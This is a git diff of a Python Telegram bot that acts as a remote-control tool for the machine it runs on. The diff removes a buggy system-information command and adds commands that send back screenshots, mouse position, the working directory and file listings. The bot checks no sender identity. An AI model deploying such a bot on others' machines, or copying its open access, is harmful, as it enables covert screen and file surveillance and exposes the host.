@@ -1,33 +1,24 @@
 import telegram.ext
 import pyautogui
 import datetime
-import platform
-import socket
+import os
 
 with open('token.txt', 'r') as f:
     TOKEN = f.read()
 
 
-def system_information(update, context):
-    try:
-        hostname = socket.gethostname()
-        ip = socket.gethostbyname(hostname)
-        plat = platform.processor()
-        system = platform.system()
-        machine = platform.machine()
+def mouse_loction(update, context):
+    update.message.reply_text(f"{pyautogui.position()}")
 
-    except Exception as e:
-        update.message.reply_text(f"Error: {e}")
 
-    update.message.reply_text = (
-        f"System Information:\n\n"
-        f"Hostname: {hostname}\n"
-        f"IP Address: {ip}\n"
-        f"Processor: {plat}\n"
-        f"System: {system}\n"
-        f"Machine: {machine}")
+def cwd(update, context):
+    update.message.reply_text(f"{os.getcwd()}")
+    print(f"{os.getcwd()}")
 
-    update.message.reply_text("done")
+
+def ls(update, context):
+    update.message.reply_text(f"{os.listdir('.')}")
+    print("done")
 
 
 def take_screenshot():
@@ -69,6 +60,13 @@ def kamesh(update, context):
         "my name is kamesh")
 
 
+def handle_text(update, context):
+    user_text = update.message.text
+    if user_text == f"$mouse":
+        update.message.reply_text(f"{pyautogui.position()}")
+    update.message.reply_text(f"You sent: {user_text}")
+
+
 updater = telegram.ext.Updater(TOKEN, use_context=True)
 disp = updater.dispatcher
 
@@ -78,8 +76,11 @@ disp.add_handler(telegram.ext.CommandHandler("content", content))
 disp.add_handler(telegram.ext.CommandHandler("kamesh", kamesh))
 # Add the new command handler
 disp.add_handler(telegram.ext.CommandHandler("screen", screenshot))
-disp.add_handler(telegram.ext.CommandHandler("sys", system_information))
-
+disp.add_handler(telegram.ext.CommandHandler("cwd", cwd))
+disp.add_handler(telegram.ext.CommandHandler("ls", ls))
+disp.add_handler(telegram.ext.CommandHandler("mouse", mouse_loction))
+disp.add_handler(telegram.ext.MessageHandler(
+    telegram.ext.Filters.text, handle_text))
 
 updater.start_polling()
 updater.idle()
